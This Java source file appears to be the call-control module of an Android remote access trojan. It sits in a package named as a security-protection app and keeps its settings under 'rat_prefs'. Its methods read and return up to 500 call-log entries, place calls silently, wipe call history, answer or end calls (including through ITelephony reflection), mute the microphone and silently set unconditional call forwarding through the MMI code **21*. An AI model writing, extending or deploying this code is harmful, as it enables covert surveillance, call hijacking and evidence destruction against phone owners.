package com.seguranca.protecao;

import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.provider.BlockedNumberContract;
import android.provider.CallLog;
import android.telecom.TelecomManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.lang.reflect.Method;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * CallManager — full call category feature set.
 *
 * Features:
 *  - getCallLogs()         GET_CALL_LOGS
 *  - makeCall()            MAKE_CALL
 *  - deleteCallLog()       DELETE_CALL_LOG
 *  - deleteAllCallLogs()   DELETE_ALL_CALL_LOGS
 *  - blockNumber()         BLOCK_CALL / BAN_NUMBER
 *  - unblockNumber()       UNBLOCK_NUMBER
 *  - getBlockedNumbers()   GET_BLOCKED_NUMBERS
 *  - answerCall()          ANSWER_CALL  (Android 8+)
 *  - hangUpCall()          HANG_UP / END_CALL
 *  - muteCall()            MUTE_CALL
 *  - getCallState()        GET_CALL_STATE
 *  - setCallForwarding()   SET_CALL_FORWARDING
 *  - clearCallForwarding() CLEAR_CALL_FORWARDING
 */
public class CallManager {

    private static final String TAG = "CallManager";
    private final Context ctx;
    private final SimpleDateFormat sdf =
            new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    public CallManager(Context ctx) {
        this.ctx = ctx;
    }

    // ─── GET CALL LOGS ────────────────────────────────────────────────────────

    /**
     * Returns up to 500 call log entries (mixed: incoming, outgoing, missed, rejected).
     * Returns a JSON string: [{number, name, type, duration, date, readable_date}, ...]
     */
    public String getCallLogs() {
        JsonArray arr = new JsonArray();
        try {
            String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION
            };
            Cursor cursor = ctx.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                projection, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 500"
            );
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    try {
                        JsonObject entry = new JsonObject();
                        entry.addProperty("id", cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls._ID)));
                        String number = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER));
                        entry.addProperty("number", number != null ? number : "Unknown");
                        String name = cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME));
                        entry.addProperty("name", name != null ? name : "");
                        int type = cursor.getInt(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE));
                        entry.addProperty("type", resolveCallType(type));
                        entry.addProperty("type_code", type);
                        long duration = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION));
                        entry.addProperty("duration", duration);
                        entry.addProperty("duration_fmt", formatDuration(duration));
                        long date = cursor.getLong(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE));
                        entry.addProperty("date", date);
                        entry.addProperty("date_readable", sdf.format(new Date(date)));
                        arr.add(entry);
                    } catch (Exception ex) {
                        Log.e(TAG, "Row parse error: " + ex.getMessage());
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "getCallLogs error: " + e.getMessage());
        }
        return arr.toString();
    }

    private String resolveCallType(int type) {
        switch (type) {
            case CallLog.Calls.INCOMING_TYPE:  return "incoming";
            case CallLog.Calls.OUTGOING_TYPE:  return "outgoing";
            case CallLog.Calls.MISSED_TYPE:    return "missed";
            case CallLog.Calls.REJECTED_TYPE:  return "rejected";
            case CallLog.Calls.BLOCKED_TYPE:   return "blocked";
            default:                           return "unknown";
        }
    }

    private String formatDuration(long seconds) {
        if (seconds <= 0) return "0s";
        long h = seconds / 3600;
        long m = (seconds % 3600) / 60;
        long s = seconds % 60;
        if (h > 0) return h + "h " + m + "m " + s + "s";
        if (m > 0) return m + "m " + s + "s";
        return s + "s";
    }

    // ─── MAKE CALL ───────────────────────────────────────────────────────────

    /**
     * Initiates a phone call via TelecomManager (silent) or ACTION_CALL intent.
     */
    public String makeCall(String number) {
        if (number == null || number.trim().isEmpty()) {
            return "ERROR: number is required";
        }
        try {
            Uri callUri = Uri.parse("tel:" + number.trim());

            // Prefer TelecomManager for silent dialing (no UI flash on many ROMs)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                    if (tm != null) {
                        tm.placeCall(callUri, null);
                        Log.d(TAG, "makeCall via TelecomManager: " + number);
                        return "OK: calling " + number;
                    }
                } catch (Exception te) {
                    Log.w(TAG, "TelecomManager placeCall failed: " + te.getMessage());
                }
            }

            // Fallback: ACTION_CALL
            Intent callIntent = new Intent(Intent.ACTION_CALL, callUri);
            callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(callIntent);
            return "OK: calling " + number;
        } catch (Exception e) {
            Log.e(TAG, "makeCall error: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── DELETE CALL LOG ─────────────────────────────────────────────────────

    /**
     * Deletes a single call log entry by its _ID.
     */
    public String deleteCallLog(long id) {
        try {
            int deleted = ctx.getContentResolver().delete(
                CallLog.Calls.CONTENT_URI,
                CallLog.Calls._ID + " = ?",
                new String[]{String.valueOf(id)}
            );
            Log.d(TAG, "deleteCallLog id=" + id + " → " + deleted + " rows");
            return deleted > 0 ? "OK: deleted id=" + id : "NOT_FOUND: id=" + id;
        } catch (Exception e) {
            Log.e(TAG, "deleteCallLog error: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes all call log entries for a specific number.
     */
    public String deleteCallLogByNumber(String number) {
        if (number == null || number.trim().isEmpty()) return "ERROR: number required";
        try {
            int deleted = ctx.getContentResolver().delete(
                CallLog.Calls.CONTENT_URI,
                CallLog.Calls.NUMBER + " = ?",
                new String[]{number.trim()}
            );
            return "OK: deleted " + deleted + " entries for " + number;
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Deletes ALL call log entries on the device.
     */
    public String deleteAllCallLogs() {
        try {
            int deleted = ctx.getContentResolver().delete(
                CallLog.Calls.CONTENT_URI, null, null
            );
            Log.d(TAG, "deleteAllCallLogs → " + deleted + " rows");
            return "OK: deleted " + deleted + " call log entries";
        } catch (Exception e) {
            Log.e(TAG, "deleteAllCallLogs error: " + e.getMessage());
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── BLOCK / BAN NUMBER ──────────────────────────────────────────────────

    /**
     * Blocks an incoming number (Android 7+).
     * On older versions falls back to adding to a local blocklist prefs key.
     */
    public String blockNumber(String number) {
        if (number == null || number.trim().isEmpty()) return "ERROR: number required";
        String num = number.trim();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ContentValues values = new ContentValues();
                values.put(BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER, num);
                Uri result = ctx.getContentResolver().insert(
                    BlockedNumberContract.BlockedNumbers.CONTENT_URI, values
                );
                Log.d(TAG, "blockNumber: " + num + " → " + result);
                saveLocalBlock(num);
                return "OK: " + num + " blocked (system + local)";
            } else {
                saveLocalBlock(num);
                return "OK: " + num + " added to local blocklist (Android < 7)";
            }
        } catch (Exception e) {
            Log.e(TAG, "blockNumber error: " + e.getMessage());
            // Fallback to local only
            saveLocalBlock(num);
            return "OK: " + num + " added to local blocklist (system block failed: " + e.getMessage() + ")";
        }
    }

    /**
     * Unblocks a previously blocked number.
     */
    public String unblockNumber(String number) {
        if (number == null || number.trim().isEmpty()) return "ERROR: number required";
        String num = number.trim();
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                ctx.getContentResolver().delete(
                    BlockedNumberContract.BlockedNumbers.CONTENT_URI,
                    BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER + " = ?",
                    new String[]{num}
                );
            }
            removeLocalBlock(num);
            return "OK: " + num + " unblocked";
        } catch (Exception e) {
            Log.e(TAG, "unblockNumber error: " + e.getMessage());
            removeLocalBlock(num);
            return "OK: " + num + " removed from local blocklist";
        }
    }

    /**
     * Returns all blocked numbers (system + local).
     */
    public String getBlockedNumbers() {
        JsonArray arr = new JsonArray();
        // System blocked numbers (Android 7+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            try {
                Cursor cursor = ctx.getContentResolver().query(
                    BlockedNumberContract.BlockedNumbers.CONTENT_URI,
                    new String[]{
                        BlockedNumberContract.BlockedNumbers.COLUMN_ID,
                        BlockedNumberContract.BlockedNumbers.COLUMN_ORIGINAL_NUMBER
                    },
                    null, null, null
                );
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        JsonObject e = new JsonObject();
                        e.addProperty("id", cursor.getLong(0));
                        e.addProperty("number", cursor.getString(1));
                        e.addProperty("source", "system");
                        arr.add(e);
                    }
                    cursor.close();
                }
            } catch (Exception ex) {
                Log.e(TAG, "getBlockedNumbers system: " + ex.getMessage());
            }
        }
        // Local blocklist
        try {
            String local = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE)
                .getString("blocked_numbers", "[]");
            JsonArray localArr = JsonParser.parseString(local).getAsJsonArray();
            for (int i = 0; i < localArr.size(); i++) {
                String num = localArr.get(i).getAsString();
                boolean already = false;
                for (int j = 0; j < arr.size(); j++) {
                    if (arr.get(j).getAsJsonObject().get("number").getAsString().equals(num)) {
                        already = true; break;
                    }
                }
                if (!already) {
                    JsonObject e = new JsonObject();
                    e.addProperty("number", num);
                    e.addProperty("source", "local");
                    arr.add(e);
                }
            }
        } catch (Exception ignored) {}
        return arr.toString();
    }

    private void saveLocalBlock(String number) {
        try {
            android.content.SharedPreferences prefs = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("blocked_numbers", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            for (int i = 0; i < arr.size(); i++) {
                if (arr.get(i).getAsString().equals(number)) return;
            }
            arr.add(number);
            prefs.edit().putString("blocked_numbers", arr.toString()).apply();
        } catch (Exception ignored) {}
    }

    private void removeLocalBlock(String number) {
        try {
            android.content.SharedPreferences prefs = ctx.getSharedPreferences("rat_prefs", Context.MODE_PRIVATE);
            String json = prefs.getString("blocked_numbers", "[]");
            JsonArray arr = JsonParser.parseString(json).getAsJsonArray();
            JsonArray newArr = new JsonArray();
            for (int i = 0; i < arr.size(); i++) {
                if (!arr.get(i).getAsString().equals(number)) newArr.add(arr.get(i));
            }
            prefs.edit().putString("blocked_numbers", newArr.toString()).apply();
        } catch (Exception ignored) {}
    }

    // ─── ANSWER / HANG UP CALL ───────────────────────────────────────────────

    /**
     * Answers an incoming call (Android 8+).
     */
    public String answerCall() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                if (tm != null) {
                    tm.acceptRingingCall();
                    return "OK: answered ringing call";
                }
            }
            // Fallback: broadcast HEADSETHOOK
            Intent i = new Intent(Intent.ACTION_MEDIA_BUTTON);
            i.putExtra(Intent.EXTRA_KEY_EVENT,
                new android.view.KeyEvent(android.view.KeyEvent.ACTION_UP,
                    android.view.KeyEvent.KEYCODE_HEADSETHOOK));
            ctx.sendBroadcast(i);
            return "OK: answer broadcast sent";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    /**
     * Ends/rejects current call.
     */
    public String hangUpCall() {
        try {
            // Android 9+: TelecomManager.endCall() (needs ANSWER_PHONE_CALLS)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                TelecomManager tm = (TelecomManager) ctx.getSystemService(Context.TELECOM_SERVICE);
                if (tm != null) {
                    try {
                        tm.endCall();
                        return "OK: call ended via TelecomManager";
                    } catch (Exception te) {
                        Log.w(TAG, "endCall TelecomManager: " + te.getMessage());
                    }
                }
            }
            // Fallback: reflection on ITelephony
            TelephonyManager tel = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tel != null) {
                try {
                    Class<?> cls = Class.forName(tel.getClass().getName());
                    Method m = cls.getDeclaredMethod("getITelephony");
                    m.setAccessible(true);
                    Object iTel = m.invoke(tel);
                    Method end = iTel.getClass().getDeclaredMethod("endCall");
                    end.invoke(iTel);
                    return "OK: call ended via ITelephony reflection";
                } catch (Exception re) {
                    Log.w(TAG, "ITelephony reflection: " + re.getMessage());
                }
            }
            return "ERROR: unable to hang up (no ANSWER_PHONE_CALLS permission?)";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── MUTE CALL ───────────────────────────────────────────────────────────

    /**
     * Mutes or unmutes the microphone during a call.
     */
    public String muteCall(boolean mute) {
        try {
            android.media.AudioManager am =
                (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setMicrophoneMute(mute);
                Log.d(TAG, "muteCall: " + mute);
                return "OK: microphone " + (mute ? "muted" : "unmuted");
            }
            return "ERROR: AudioManager null";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── CALL STATE ──────────────────────────────────────────────────────────

    /**
     * Returns current telephony call state as JSON.
     */
    public String getCallState() {
        try {
            TelephonyManager tel =
                (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            JsonObject obj = new JsonObject();
            if (tel != null) {
                int state = tel.getCallState();
                String stateStr;
                switch (state) {
                    case TelephonyManager.CALL_STATE_IDLE:    stateStr = "IDLE";    break;
                    case TelephonyManager.CALL_STATE_RINGING: stateStr = "RINGING"; break;
                    case TelephonyManager.CALL_STATE_OFFHOOK: stateStr = "ACTIVE";  break;
                    default:                                   stateStr = "UNKNOWN"; break;
                }
                obj.addProperty("state", stateStr);
                obj.addProperty("state_code", state);
                android.media.AudioManager am =
                    (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
                if (am != null) {
                    obj.addProperty("muted", am.isMicrophoneMute());
                    obj.addProperty("speaker_on", am.isSpeakerphoneOn());
                }
            }
            return obj.toString();
        } catch (Exception e) {
            return "{\"error\":\"" + e.getMessage() + "\"}";
        }
    }

    // ─── CALL FORWARDING ─────────────────────────────────────────────────────

    /**
     * Opens native call forwarding settings or sends MMI code.
     * forwardTo == null clears forwarding.
     */
    public String setCallForwarding(String forwardTo) {
        try {
            if (forwardTo != null && !forwardTo.isEmpty()) {
                // MMI code: **21*<number>#  (unconditional forward activate)
                String mmiCode = "**21*" + forwardTo.trim() + "#";
                Uri mmiUri = Uri.parse("tel:" + Uri.encode(mmiCode));
                Intent intent = new Intent(Intent.ACTION_CALL, mmiUri);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
                return "OK: forwarding MMI sent: " + mmiCode;
            } else {
                return clearCallForwarding();
            }
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    public String clearCallForwarding() {
        try {
            // MMI code: ##21# (unconditional forward deactivate)
            Uri mmiUri = Uri.parse("tel:" + Uri.encode("##21#"));
            Intent intent = new Intent(Intent.ACTION_CALL, mmiUri);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
            return "OK: call forwarding cleared";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }

    // ─── SPEAKER / EARPIECE ──────────────────────────────────────────────────

    public String setSpeakerphone(boolean on) {
        try {
            android.media.AudioManager am =
                (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
            if (am != null) {
                am.setSpeakerphoneOn(on);
                return "OK: speakerphone " + (on ? "on" : "off");
            }
            return "ERROR: AudioManager null";
        } catch (Exception e) {
            return "ERROR: " + e.getMessage();
        }
    }
}
